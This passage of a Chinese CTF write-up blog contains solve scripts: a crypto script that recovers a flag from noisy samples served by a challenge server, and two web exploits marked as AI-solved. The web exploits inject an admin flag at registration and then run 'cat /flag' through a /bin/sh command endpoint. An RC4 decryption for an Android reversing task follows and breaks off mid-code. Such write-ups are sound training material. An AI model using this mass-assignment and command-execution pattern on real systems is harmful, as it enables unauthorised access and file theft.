class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, ast</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;106.14.191.23&quot;</span>   <span class="comment"># 远程服务地址</span></span><br><span class="line">PORT = <span class="number">53481</span>             <span class="comment"># 远程服务端口</span></span><br><span class="line">NUM_QUERIES = <span class="number">600</span>        <span class="comment"># 查询次数，可取&lt;=1096，样本越多恢复越稳健</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 连接服务并获取 Public Seed</span></span><br><span class="line">sock = socket.socket()</span><br><span class="line">sock.connect((HOST, PORT))</span><br><span class="line">data = sock.recv(<span class="number">1024</span>).decode()  <span class="comment"># 接收初始信息，包括种子</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Failed to receive data from server.&quot;</span>)</span><br><span class="line"><span class="comment"># 数据可能包含 &quot;Public Seed:&lt;seed&gt;\nGive me your choice&gt;&quot;</span></span><br><span class="line"><span class="comment"># 确保读到种子整行</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Public Seed:&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">    <span class="comment"># 若首次未完整，则继续接收</span></span><br><span class="line">    more = sock.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    data += more</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析种子字符串</span></span><br><span class="line">lines = data.splitlines()</span><br><span class="line">seed_line = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">if</span> line.startswith(<span class="string">&quot;Public Seed:&quot;</span>):</span><br><span class="line">        seed_line = line</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> seed_line <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Public Seed not found in server response.&quot;</span>)</span><br><span class="line">seed_value = seed_line.split(<span class="string">&quot;Public Seed:&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Public Seed = <span class="subst">&#123;seed_value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 依照种子重建矩阵 A (128x128, 元素0-99)，并确保其可逆</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">rng = random.Random()</span><br><span class="line">rng.seed(seed_value.encode())  <span class="comment"># 注意按服务器相同行为，用 bytes 作为种子</span></span><br><span class="line">n = <span class="number">128</span></span><br><span class="line">p = <span class="number">31337</span></span><br><span class="line"><span class="comment"># 生成随机矩阵直至满秩</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    A = [[rng.randint(<span class="number">0</span>, <span class="number">99</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> __ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="comment"># 高斯消元求秩</span></span><br><span class="line">    M = [row.copy() <span class="keyword">for</span> row <span class="keyword">in</span> A]</span><br><span class="line">    rank = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="comment"># 找到当前列的非零主元</span></span><br><span class="line">        pivot = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(rank, n):</span><br><span class="line">            <span class="keyword">if</span> M[r][col] % p != <span class="number">0</span>:</span><br><span class="line">                pivot = r</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> pivot <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 交换到当前秩行</span></span><br><span class="line">        M[rank], M[pivot] = M[pivot], M[rank]</span><br><span class="line">        <span class="comment"># 归一化主元所在行</span></span><br><span class="line">        inv_val = <span class="built_in">pow</span>(M[rank][col], -<span class="number">1</span>, p)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(col, n):</span><br><span class="line">            M[rank][c] = (M[rank][c] * inv_val) % p</span><br><span class="line">        <span class="comment"># 消去该列下方元素</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(rank+<span class="number">1</span>, n):</span><br><span class="line">            <span class="keyword">if</span> M[r][col] % p != <span class="number">0</span>:</span><br><span class="line">                factor = M[r][col]</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(col, n):</span><br><span class="line">                    M[r][c] = (M[r][c] - factor * M[rank][c]) % p</span><br><span class="line">        rank += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> rank == n:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> rank == n:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 此时 A 为可逆矩阵</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Matrix A generated (full rank). Beginning queries...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 多次查询获取输出向量数据</span></span><br><span class="line">outputs = []  <span class="comment"># 将存储每次返回的长度128的列表</span></span><br><span class="line"><span class="comment"># 如果先前接收的数据中已经包含初始的 &quot;Give me your choice&gt;&quot; 提示，需要处理</span></span><br><span class="line"><span class="comment"># 寻找提示符位置（如果存在）</span></span><br><span class="line">prompt_index = data.find(<span class="string">&quot;Give me your choice&gt;&quot;</span>)</span><br><span class="line"><span class="comment"># 若接收到 prompt，没有换行，需要人为加上换行以避免干扰后续解析</span></span><br><span class="line"><span class="keyword">if</span> prompt_index != -<span class="number">1</span> <span class="keyword">and</span> data.endswith(<span class="string">&quot;Give me your choice&gt;&quot;</span>):</span><br><span class="line">    <span class="comment"># prompt 没有换行且是最后内容，直接忽略，它会在交互中重新出现</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行 NUM_QUERIES 次查询</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(NUM_QUERIES):</span><br><span class="line">    <span class="comment"># 发送 &#x27;1&#x27; 请求一个样本</span></span><br><span class="line">    sock.sendall(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">    <span class="comment"># 接收该次的输出列表字符串（注意列表较长，需循环读取直到得到完整的&#x27;]&#x27;）</span></span><br><span class="line">    resp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;]&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp:</span><br><span class="line">        chunk = sock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Connection closed before receiving full response.&quot;</span>)</span><br><span class="line">        resp += chunk</span><br><span class="line">    <span class="comment"># 截取列表字符串部分（从第一个&#x27;[&#x27;到对应的第一个&#x27;]&#x27;）</span></span><br><span class="line">    start = resp.find(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    end = resp.find(<span class="string">&#x27;]&#x27;</span>, start)</span><br><span class="line">    list_str = resp[start:end+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        nums = ast.literal_eval(list_str)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Failed to parse output list: <span class="subst">&#123;e&#125;</span>\nData: <span class="subst">&#123;list_str&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) != n:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Output length <span class="subst">&#123;<span class="built_in">len</span>(nums)&#125;</span> != <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">    outputs.append(nums)</span><br><span class="line">    <span class="comment"># 打印进度</span></span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>) % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Collected <span class="subst">&#123;i+<span class="number">1</span>&#125;</span> samples...&quot;</span>)</span><br><span class="line">    <span class="comment"># 保存末尾未处理的数据（可能包含下一个提示符）</span></span><br><span class="line">    resp = resp[end+<span class="number">1</span>:]</span><br><span class="line">    <span class="comment"># 如果末尾含提示符，下次循环会再次recv，不影响正确性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 完成采样后，发送非&#x27;1&#x27;使服务器退出循环</span></span><br><span class="line">sock.sendall(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">sock.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Collected <span class="subst">&#123;<span class="built_in">len</span>(outputs)&#125;</span> outputs. Processing data...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 对每个分量聚类去噪，估计 A*s</span></span><br><span class="line">As_values = [<span class="number">0</span>] * n</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    vals = [outputs[i][j] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(outputs))]</span><br><span class="line">    vals.sort()</span><br><span class="line">    <span class="comment"># 检测是否发生模绕回（两簇现象）</span></span><br><span class="line">    <span class="keyword">if</span> vals[-<span class="number">1</span>] - vals[<span class="number">0</span>] &gt; p // <span class="number">2</span>:</span><br><span class="line">        <span class="comment"># 存在两簇：决定哪簇是主要簇</span></span><br><span class="line">        <span class="comment"># 通过中位数判断主要簇位置</span></span><br><span class="line">        median_val = vals[<span class="built_in">len</span>(vals)//<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> median_val &gt; p // <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># 主要簇在高值端，将低值簇的值加上一个模数p</span></span><br><span class="line">            <span class="comment"># 寻找最大间隔点作为簇分界</span></span><br><span class="line">            diffs = [vals[i+<span class="number">1</span>] - vals[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(vals)-<span class="number">1</span>)]</span><br><span class="line">            idx = diffs.index(<span class="built_in">max</span>(diffs))</span><br><span class="line">            low_cluster = vals[:idx+<span class="number">1</span>]</span><br><span class="line">            high_cluster = vals[idx+<span class="number">1</span>:]</span><br><span class="line">            low_cluster_adjusted = [v + p <span class="keyword">for</span> v <span class="keyword">in</span> low_cluster]</span><br><span class="line">            vals = <span class="built_in">sorted</span>(low_cluster_adjusted + high_cluster)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 主要簇在低值端，将高值簇减去一个模数p</span></span><br><span class="line">            diffs = [vals[i+<span class="number">1</span>] - vals[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(vals)-<span class="number">1</span>)]</span><br><span class="line">            idx = diffs.index(<span class="built_in">max</span>(diffs))</span><br><span class="line">            low_cluster = vals[:idx+<span class="number">1</span>]</span><br><span class="line">            high_cluster = vals[idx+<span class="number">1</span>:]</span><br><span class="line">            high_cluster_adjusted = [v - p <span class="keyword">for</span> v <span class="keyword">in</span> high_cluster]</span><br><span class="line">            vals = <span class="built_in">sorted</span>(low_cluster + high_cluster_adjusted)</span><br><span class="line">    <span class="comment"># 取平均值作为 (A*s)_j 的估计，并四舍五入取最近整数</span></span><br><span class="line">    avg_val = <span class="built_in">sum</span>(vals) / <span class="built_in">len</span>(vals)</span><br><span class="line">    As_values[j] = <span class="built_in">int</span>(<span class="built_in">round</span>(avg_val)) % p  <span class="comment"># 最终取模 p 确保在 [0,p) </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 计算 s = A^&#123;-1&#125; * (A*s) 来求解 s</span></span><br><span class="line"><span class="comment"># 先对 A 进行模 p 下求逆</span></span><br><span class="line"><span class="comment"># 构造增广矩阵 [A|I] 做高斯消元</span></span><br><span class="line">Aug = [row[:] + [<span class="number">1</span> <span class="keyword">if</span> i == j <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> i, row <span class="keyword">in</span> <span class="built_in">enumerate</span>(A)]</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="comment"># 找到主元</span></span><br><span class="line">    pivot = col</span><br><span class="line">    <span class="keyword">while</span> pivot &lt; n <span class="keyword">and</span> Aug[pivot][col] % p == <span class="number">0</span>:</span><br><span class="line">        pivot += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> pivot == n:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Matrix is singular during inversion (unexpected).&quot;</span>)</span><br><span class="line">    <span class="comment"># 将主元行换到当前列对应行</span></span><br><span class="line">    Aug[col], Aug[pivot] = Aug[pivot], Aug[col]</span><br><span class="line">    inv_val = <span class="built_in">pow</span>(Aug[col][col], -<span class="number">1</span>, p)</span><br><span class="line">    <span class="comment"># 主元归一化</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">        Aug[col][c] = (Aug[col][c] * inv_val) % p</span><br><span class="line">    <span class="comment"># 消去其他行该列</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span> r != col:</span><br><span class="line">            factor = Aug[r][col]</span><br><span class="line">            <span class="keyword">if</span> factor != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(col, <span class="number">2</span>*n):</span><br><span class="line">                    Aug[r][c] = (Aug[r][c] - factor * Aug[col][c]) % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取逆矩阵</span></span><br><span class="line">A_inv = [row[n:] <span class="keyword">for</span> row <span class="keyword">in</span> Aug]</span><br><span class="line"><span class="comment"># 计算 s = A_inv * (A*s 值向量)</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        total = (total + A_inv[i][j] * As_values[j]) % p</span><br><span class="line">    s.append(total)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 从 s 导出 flag（s[i] mod 200 为 ASCII 码）</span></span><br><span class="line">flag_chars = [<span class="built_in">chr</span>(x % <span class="number">200</span>) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag_chars)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Recovered flag:&quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005221355601.png" alt="image-20251005221355601"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="am-i-admin"><a href="#am-i-admin" class="headerlink" title="am i admin?"></a>am i admin?</h3><p>AI出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://106.14.191.23:56062&quot;</span>  <span class="comment"># 视题目部署实际地址调整</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username, password</span>):</span><br><span class="line">    payload = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;IsAdmin&quot;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/register&quot;</span>, json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] register:&quot;</span>, r.status_code, r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username, password</span>):</span><br><span class="line">    payload = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/login&quot;</span>, json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] login:&quot;</span>, r.status_code, r.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] cookies:&quot;</span>, session.cookies.get_dict())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_command</span>(<span class="params">cmd, args</span>):</span><br><span class="line">    payload = &#123;<span class="string">&quot;cmd&quot;</span>: cmd, <span class="string">&quot;args&quot;</span>: args&#125;</span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/run&quot;</span>, json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] run:&quot;</span>, r.status_code, r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    username = <span class="string">&quot;pwn&quot;</span></span><br><span class="line">    password = <span class="string">&quot;pwn&quot;</span></span><br><span class="line"></span><br><span class="line">    register(username, password)  <span class="comment"># 第一步：注册并注入 IsAdmin</span></span><br><span class="line">    login(username, password)  <span class="comment"># 第二步：登录拿到 session_id</span></span><br><span class="line">    run_command(<span class="string">&quot;cat&quot;</span>, [<span class="string">&quot;/flag&quot;</span>])  <span class="comment"># 第三步：以管理员身份读 flag</span></span><br><span class="line">    <span class="comment"># run_command(&quot;id&quot;, [])                 # 可执行任意命令测试</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005221442895.png" alt="image-20251005221442895"></p><h3 id="am-i-admin-2"><a href="#am-i-admin-2" class="headerlink" title="am i admin?2"></a>am i admin?2</h3><p>AI 出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://106.14.191.23:59608&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    username = <span class="string">&quot;pwn&quot;</span> + secrets.token_hex(<span class="number">4</span>)</span><br><span class="line">    password = <span class="string">&quot;Passw0rd!&quot;</span></span><br><span class="line">    register_data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;isadmin&quot;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">    r = sess.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/register&quot;</span>, json=register_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;register:&quot;</span>, r.status_code, r.text)</span><br><span class="line"></span><br><span class="line">    login_data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = sess.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/login&quot;</span>, json=login_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;login:&quot;</span>, r.status_code, r.text)</span><br><span class="line"></span><br><span class="line">    cmd_payload = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;args&quot;</span>: [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat /flag&quot;</span>]&#125;</span><br><span class="line">    r = sess.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/run&quot;</span>, json=cmd_payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;run:&quot;</span>, r.status_code, r.json())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005221511012.png" alt="image-20251005221511012"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="android-native"><a href="#android-native" class="headerlink" title="android-native"></a>android-native</h3><p>native里有RC4校验</p><p>key做了更改</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251004104652628.png" alt="image-20251004104652628"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line">KEY_BYTES = <span class="built_in">bytearray</span>(<span class="string">b&quot;1m1r6rqro1l~dr&quot;</span>)</span><br><span class="line">CIPHERTEXT = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x7F</span>, <span class="number">0xD6</span>, <span class="number">0xE8</span>, <span class="number">0xE9</span>, <span class="number">0x17</span>, <span class="number">0xD1</span>, <span class="number">0x59</span>,</span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0xB1</span>, <span class="number">0x19</span>, <span class="number">0xA0</span>, <span class="number">0x57</span>, <span class="number">0x38</span>, <span class="number">0x27</span>, <span class="number">0x28</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x9A</span>, <span class="number">0x10</span>, <span class="number">0xF6</span>, <span class="number">0xD2</span>, <span class="number">0x75</span>, <span class="number">0x52</span>, <span class="number">0x83</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x66</span>, <span class="number">0x4C</span>, <span class="number">0xF7</span>, <span class="number">0x3D</span>, <span class="number">0x9B</span>, <span class="number">0x8F</span>, <span class="number">0x85</span>,</span><br><span class="line">    <span class="number">0x4A</span>, <span class="number">0xD7</span>, <span class="number">0x08</span>, <span class="number">0xF4</span>, <span class="number">0x6D</span>, <span class="number">0xE7</span>, <span class="number">0xA9</span>, <span class="number">0x1D</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0x9C</span>, <span class="number">0x0F</span>, <span class="number">0x8A</span>,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">MUTATION_MASKS = &#123;</span><br><span class="line">    <span class="number">1</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">2</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">4</span>: <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">5</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">6</span>: <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">7</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">8</span>: <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">9</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">10</span>: <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">11</span>: <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">12</span>: <span class="number">0x01</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mutate_key</span>(<span class="params">key: <span class="built_in">bytearray</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">for</span> idx, mask <span class="keyword">in</span> MUTATION_MASKS.items():</span><br><span class="line">        key[idx] ^= mask</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_crypt</span>(<span class="params">data: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    state = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + state[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">        state[i], state[j] = state[j], state[i]</span><br><span class="line"></span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + state[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        state[i], state[j] = state[j], state[i]</span><br><span class="line">        k = state[(state[i] + state[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line">        out.append(byte ^ 